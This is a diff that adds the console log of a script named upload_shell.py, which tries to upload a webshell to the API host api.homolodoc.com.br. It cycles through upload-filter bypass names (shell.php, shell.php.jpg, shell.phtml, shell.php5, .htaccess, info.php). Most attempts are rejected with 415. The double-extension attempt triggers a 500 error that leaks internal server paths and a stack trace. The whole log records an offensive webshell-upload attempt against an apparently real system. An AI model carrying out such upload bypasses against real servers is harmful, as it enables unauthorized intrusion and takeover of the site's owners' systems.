@@ -1,0 +1,38 @@
+./upload_shell.py 
+[+] Tentando upload de webshell...
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.homolodoc.com.br'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+
+[*] Upload de shell.php
+    Status: 415
+    Response: {"data":null,"error":{"message":"Unsupported Media Type","code":415,"trace":[{"file":"\/var\/www\/app\/Http\/Middleware\/ValidateFiles.php","line":110,"function":"validateFiles","class":"App\\Http\\Middleware\\ValidateFiles","type":"->","args":[{"file":{"name":"shell.php","type":"application\/x-php"
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.homolodoc.com.br'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+
+[*] Upload de shell.php.jpg
+    Status: 500
+    Response: {"data":null,"error":{"message":"Too few arguments to function App\\Http\\Controllers\\Platform\\PlatformController::__construct(), 0 passed in \/var\/www\/app\/Http\/Services\/Company\/CompanyService.php on line 203 and exactly 2 expected","code":0,"trace":[{"file":"\/var\/www\/app\/Http\/Services\
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.homolodoc.com.br'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+
+[*] Upload de shell.phtml
+    Status: 415
+    Response: {"data":null,"error":{"message":"Unsupported Media Type","code":415,"trace":[{"file":"\/var\/www\/app\/Http\/Middleware\/ValidateFiles.php","line":110,"function":"validateFiles","class":"App\\Http\\Middleware\\ValidateFiles","type":"->","args":[{"file":{"name":"shell.phtml","type":"text\/html","tmp_
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.homolodoc.com.br'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+
+[*] Upload de shell.php5
+    Status: 415
+    Response: {"data":null,"error":{"message":"Unsupported Media Type","code":415,"trace":[{"file":"\/var\/www\/app\/Http\/Middleware\/ValidateFiles.php","line":110,"function":"validateFiles","class":"App\\Http\\Middleware\\ValidateFiles","type":"->","args":[{"file":{"name":"shell.php5","type":"application\/x-php
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.homolodoc.com.br'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+
+[*] Upload de .htaccess
+    Status: 415
+    Response: {"data":null,"error":{"message":"Unsupported Media Type","code":415,"trace":[{"file":"\/var\/www\/app\/Http\/Middleware\/ValidateFiles.php","line":110,"function":"validateFiles","class":"App\\Http\\Middleware\\ValidateFiles","type":"->","args":[{"file":{"name":".htaccess","type":"text\/plain","tmp_n
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'api.homolodoc.com.br'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
+  warnings.warn(
+
+[*] Upload de info.php
+    Status: 415
+    Response: {"data":null,"error":{"message":"Unsupported Media Type","code":415,"trace":[{"file":"\/var\/www\/app\/Http\/Middleware\/ValidateFiles.php","line":110,"function":"validateFiles","class":"App\\Http\\Middleware\\ValidateFiles","type":"->","args":[{"file":{"name":"info.php","type":"text\/php","tmp_name
